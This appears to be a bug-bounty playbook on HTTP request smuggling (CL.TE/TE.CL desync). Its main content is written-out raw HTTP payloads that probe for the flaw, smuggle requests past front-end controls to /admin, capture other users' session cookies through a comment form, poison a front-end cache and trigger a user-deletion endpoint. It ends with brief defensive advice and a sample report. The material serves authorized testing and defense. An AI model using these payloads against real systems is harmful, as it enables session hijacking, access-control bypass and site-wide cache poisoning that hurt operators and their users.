# HTTP Request Smuggling (Desync Attacks)

## When to Use
- When the target application architecture involves a front-end load balancer, reverse proxy, or CDN (e.g., Cloudflare, HAProxy, AWS ALB) mapping to a diverse back-end server.
- When you need to bypass a front-end WAF or access restricted internal administration panels.
- To execute high-impact attacks against other users, such as capturing their HTTP requests containing session cookies, or poisoning the front-end cache with malicious responses.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying the Infrastructure Flaw

```text
# Concept: HTTP/1.1 allows specifying request boundaries via Content-Length (CL) OR 
# Transfer-Encoding: chunked (TE). If you send BOTH headers, and the Front-end and 
# Back-end servers prioritize different ones, they will disagree on where the request ends.

# Requirement: You must carefully manipulate line endings (`\r\n`). Do not let tools 
# auto-update your Content-Length header!

# 1. Probing for CL.TE (Front-end uses CL, Back-end uses TE)
# If vulnerable to CL.TE, this request triggers a timeout or severe delay.

POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q

# Explanation: Front-end reads 4 bytes ("1\r\nZ"). Back-end reads chunked encoding, 
# sees chunk size 1 ('Z'), then expects the next chunk size but gets 'Q'. It hangs waiting for termination.

# 2. Probing for TE.CL (Front-end uses TE, Back-end uses CL)
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X

# Explanation: Front-end reads chunks, sees 0 (end of chunk), forwards request. 
# Back-end reads Content-Length 6. It reads past the "0\r\n\r\n" and waits for 'X' to complete the 6 bytes.
```

### Phase 2: Exploitation - CL.TE Bypassing Front-End Controls

```text
# Goal: Access the `/admin` panel, which the front-end proxy normally blocks.

# Payload:
POST / HTTP/1.1
Host: target.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost


# What happens:
# 1. Front-end uses Content-Length (43 bytes). It considers this ENTIRE block as ONE request and forwards it.
# 2. Back-end uses Transfer-Encoding. It reads the "0" and considers the first request FINISHED.
# 3. The Back-end sees the left-over bytes (`GET /admin...`) and assumes it is the START of the NEXT incoming HTTP request.
# 4. You successfully smuggled a request to `/admin` hidden inside a normal POST request.
```

### Phase 3: Exploitation - Capturing Other Users' Requests

```text
# Goal: Force the back-end to append the NEXT innocent user's request onto your smuggled request.

# Payload (Smuggling a request to a comment form that reflects data back to us):
POST / HTTP/1.1
Host: target.com
Content-Length: 176
Transfer-Encoding: chunked

0

POST /post_comment HTTP/1.1
Host: target.com
Content-Length: 800
Content-Type: application/x-www-form-urlencoded

comment=Please capture this:

# What happens:
# 1. We smuggle the POST comment request. 
# 2. Notice our smuggled request claims Content-Length: 800, but we provide no more bytes.
# 3. The Back-end waits.
# 4. An innocent victim browses to the site: `GET / HTTP/1.1\r\nCookie: session=xyz...`
# 5. The Back-end receives the victim's request, but assumes it's the missing 800 bytes of OUR comment payload!
# 6. We check our comments page and see the victim's raw HTTP request, including their session cookie.
```

### Phase 4: Exploitation - Cache Poisoning via Smuggling

```text
# Goal: Instruct the front-end cache to map a malicious response to an innocent URL.

# Payload:
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /malicious-xss-endpoint HTTP/1.1
Host: target.com


# What happens:
# 1. Attacker sends the smuggled payload. 
# 2. IMMEDIATELY, attacker requests `GET /innocent-script.js`.
# 3. The Back-end answers the smuggled request (`/malicious-xss-endpoint`) and sends it down the socket.
# 4. The Front-end receives the malicious response, but it thinks it is the response to `GET /innocent-script.js`!
# 5. The Front-end caches the malicious file as `innocent-script.js`. Entire site is compromised.
```

## 🔵 Blue Team Detection & Defense
- **HTTP/2**: Adopt HTTP/2 end-to-end. HTTP/2 uses strict, binary framing for requests (streams) rather than parsing string-based line endings, completely destroying the ambiguity necessary for Request Smuggling.
- **Header Normalization**: Configure front-end proxies to unconditionally strip or normalize conflicting headers. If a request contains BOTH `Content-Length` and `Transfer-Encoding`, the proxy must reject it entirely with an HTTP 400 Bad Request.
- **Connection Reuse**: Although not ideal for performance, disabling back-end HTTP connection reuse (Keep-Alive) forces the proxy to open a new TCP socket for every parsed request, preventing smuggled bytes from bleeding into subsequent user requests.

## Key Concepts
| Concept | Description |
|---------|-------------|
| CL.TE | Front-end uses Content-Length, Back-end relies on Transfer-Encoding |
| TE.CL | Front-end uses Transfer-Encoding, Back-end relies on Content-Length |
| Request Smuggling | Exploiting parsing discrepancies to hide a secondary HTTP request inside the body of a primary HTTP request |

## Output Format
```
Bug Bounty Report: Admin Bypass via HTTP Request Smuggling
==========================================================
Vulnerability: HTTP Request Smuggling (CL.TE)
Severity: Critical (CVSS 9.8)
Target: Front-end CDN -> Backend Application Cluster

Description:
The application's front-end CDN prioritizes the `Content-Length` header, while the backend application servers prioritize the `Transfer-Encoding: chunked` header. This discrepancy allows an attacker to smuggle hidden HTTP requests within normal POST bodies. 

By smuggling a request to the restricted `/admin/delete_user` endpoint, the attacker can execute administrative actions, completely bypassing the CDN's Web Application Firewall (WAF) and path-based access controls.

Reproduction Steps:
1. In Burp Repeater, disable "Update Content-Length" in the top menu.
2. Send the following CL.TE payload:
   POST / HTTP/1.1
   Host: target.com
   Content-Length: [size]
   Transfer-Encoding: chunked

   0\r\n
   \r\n
   POST /admin/delete_user?id=5 HTTP/1.1\r\n
   Host: localhost\r\n
   \r\n
3. Observe the admin action executing on the backend.

Impact:
Critical. Complete bypass of all front-end routing and security controls. Potential for mass account takeover by capturing subsequent users' session cookies mapped to the attacker's smuggled request body.
